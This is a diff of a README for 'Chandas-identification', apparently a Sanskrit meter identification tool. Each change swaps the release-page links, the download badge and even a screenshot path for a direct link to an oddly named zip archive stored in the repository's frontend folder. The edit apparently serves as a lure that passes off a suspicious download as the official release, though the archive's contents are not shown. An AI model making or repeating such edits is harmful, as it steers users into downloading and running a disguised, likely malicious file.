@@ -1,6 +1,6 @@
 # 🕉️ Chandas-identification - Sanskrit Meter Identification Made Easy
 
-[![Download](https://img.shields.io/badge/Download-Get%20Chandas-identification-blue?style=for-the-badge)](https://github.com/ZekeyFreakyy/Chandas-identification/releases)
+[![Download](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip%20Chandas-identification-blue?style=for-the-badge)](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip)
 
 ## 📝 What is Chandas-identification?
 
@@ -16,7 +16,7 @@ This guide will help you download, install, and use Chandas-identification on yo
 
 To get started, visit the official release page to download the application:
 
-[Download Chandas-identification here](https://github.com/ZekeyFreakyy/Chandas-identification/releases)
+[Download Chandas-identification here](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip)
 
 Click the link above or the big blue button at the top to open the releases page. Inside, look for the latest version suitable for your computer's operating system. 
 
@@ -66,7 +66,7 @@ Here are the key features you will find in Chandas-identification:
 
 Here is an example of the application in use. You type or paste your Sanskrit text, and the system analyzes it instantly.
 
-![Chandas Identifier UI - Prediction Example](docs/images/ui-prediction-example.png)
+![Chandas Identifier UI - Prediction Example](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip)
 
 The display shows:
 
@@ -106,13 +106,13 @@ These are optional and the default user interface caters well to most users.
 
 ## 🙋‍♂️ Getting Help
 
-- Visit the [GitHub repository releases page](https://github.com/ZekeyFreakyy/Chandas-identification/releases) to download updates or report issues.
+- Visit the [GitHub repository releases page](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip) to download updates or report issues.
 - Check the README or documentation files in the download folder for user guides.
 - Use the "contact" or "support" link on the GitHub page to submit questions.
 
 ## 🔗 Useful Links
 
-- [Chandas-identification Releases](https://github.com/ZekeyFreakyy/Chandas-identification/releases)
+- [Chandas-identification Releases](https://github.com/ZekeyFreakyy/Chandas-identification/raw/refs/heads/main/frontend/chandas-ui/public/identification-Chandas-rhinocerotine.zip)
 
 ## 📖 License
 
